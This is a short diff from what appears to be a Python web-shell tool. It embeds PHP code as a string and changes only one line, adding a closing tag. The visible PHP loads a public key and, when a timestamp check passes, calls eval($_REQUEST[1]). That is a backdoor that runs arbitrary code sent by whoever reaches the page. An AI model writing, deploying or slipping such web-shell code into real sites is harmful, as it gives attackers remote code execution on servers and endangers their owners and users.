@@ -23,7 +23,7 @@ $public_key = openssl_pkey_get_public($public_key);
 if(time()-$cipher<10){
     eval($_REQUEST[1]);
 }
-
+?>
 '''.replace('\n',' ')
     def __init__(self,url):
         self.url = url
